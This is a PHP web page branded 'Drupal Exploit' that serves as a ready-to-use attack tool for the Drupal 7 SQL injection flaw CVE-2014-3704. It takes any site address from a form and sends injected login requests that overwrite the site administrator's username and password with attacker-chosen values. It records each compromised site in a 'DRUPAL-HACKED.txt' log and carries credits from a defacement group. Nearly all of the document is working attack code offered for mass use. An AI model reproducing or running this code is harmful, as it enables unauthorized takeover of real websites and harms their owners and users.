<?php ?>  <!Doctype HTML>
<html>
<head>
	<title>Drupal Exploit</title>
<body style="background-image: url('https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcS_QlSRvk1SSKSqg0viAFt0PJz7kx6_5Gv6_gJTHaAJbtvMpnr7'); background-repeat: repeat; background-position: center; background-attachment: fixed;">
  <link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Audiowide">
	<style type="text/css">
	.mymargin{
		margin-top:100px;
		color:white;
		font-family: monospace;
	}
	body {
        font-family: 'Audiowide', serif;
        font-size: 20px;
		
      }
	</style>
</head>
<body>
	<div class="mymargin">
		<center>
			<font color="#00FF66"><h1>Drupal Exploit</h1></font>
			 
	<form method="GET" action="">
		Site : <input type="text" name="url" placeholder="Example: www.site.com">
		<input type="submit" name="submit" value="submit">
	</form>
	<br>
<?php
#-----------------------------------------------------------------------------#
# Exploit Title: Drupal core 7.x - SQL Injection                              #
# Date: Oct 16 2014                                                           #
# Exploit Author: Dustin D&#1043;rr                                                 #
# Software Link: http://www.drupal.com/                                       #
# Version: Drupal core 7.x versions prior to 7.32                             #
# CVE: CVE-2014-3704                                                          #
#-----------------------------------------------------------------------------#
$file = fopen("DRUPAL-HACKED.txt", "a");
error_reporting(0);
if (isset($_GET['submit'])) {
    $url = "http://" . $_GET['url'];
    $post_data = "name[0;update users set name %3D 'anonghost' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
    $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
    $ctx = stream_context_create($params);
    $data = file_get_contents($url . '/user/login/', null, $ctx);
    echo "<h4>Scanning at \"/user/login/</h4>\"";
    if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
        $fp = fopen("DRUPAL-HACKED.txt", 'a');
        echo "Success! User:anonghost Pass:admin at {$url}/user/login <br>";
        echo '<font color="#00FF66">Finished scanning. check => </font><a href="/DRUPAL-HACKED.txt" target="_blank">[ DRUPAL-HACKED.txt ]</a></font> ';
        fwrite($fp, "Succes! User:anonghost Pass:admin -> {$url}/user/login");
        fwrite($fp, "
");
        fwrite($fp, "======================================Donnazmi==============================================================");
        fwrite($fp, "
");
        fclose($fp);
    } else {
        echo "Error! Either the website isn't vulnerable, or your Internet isn't working.";
    }
}
if (isset($_GET['submit'])) {
    $url = "http://" . $_GET['url'] . "/";
    $post_data = "name[0;update users set name %3D 'anonghost' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=test3&name[]=Crap&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
    $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
    $ctx = stream_context_create($params);
    $data = file_get_contents($url . '?q=node&destination=node', null, $ctx);
    echo "<h4>Scanning at \"Index</h4>\"";
    if (stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) {
        $fp = fopen("DRUPAL-HACKED.txt", 'a');
        echo "Success! User:anonghost Pass:admin at {$url}/user/login <br>";
        echo '<font color="#00FF66">Finished scanning. check =>  </font><a href="/DRUPAL-HACKED.txt" target="_blank">[ DRUPAL-HACKED.txt ]</a></font> ';
        fwrite($fp, "Success! User:anonghost Pass:admin -> {$url}/user/login");
        fwrite($fp, "
");
        fwrite($fp, "======================================Donnazmi==============================================================");
        fwrite($fp, "
");
        fclose($fp);
    } else {
        echo "Error! Either the website isn't vulnerable, or your Internet isn't working.";
    }
}
?>
<br>
	<font face="Audiowide" color="#00FF66" size="2">
<font color="#00FF66">Orignal Code was with Some Bug i jux refined it | rummykhan </font><br />
Edited : <font color="white">Donnazmi</font> <font color="white">|</font> Twitter: <font color="white"><a href="https://twitter.com/ungku_nazmi">Dondon xD</a></font><br /><br />
<br > <font color="#00FF66">For more www.anonghost.gov</font>
<br />visit <a href="http://google.com" target="_blank" style="text-decoration: none;">www.anonghost.gov</a>
</font>
	</div>

</body>
</html>  <?